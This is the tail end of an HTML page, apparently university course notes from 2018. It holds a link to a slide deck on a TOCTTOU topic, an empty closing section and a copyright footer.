<li><a href="./tocttou-porter.pptx">./tocttou-porter.pptx</a> Slides
</li>
</ol>
</div>
</div>
</div>

<div id="outline-container-sec-12" class="outline-2">
<h2 id="sec-12"><span class="section-number-2">12</span> End</h2>
<div class="outline-text-2" id="text-12">
</div>
</div>
</div>
<div id="postamble" class="status">
<hr size=1>Copyright &copy; 2018 <a href="http://www.wright.edu/~pmateti">www.wright.edu/~pmateti</a> &bull; 2018-10-31
</div>
</body>
</html>
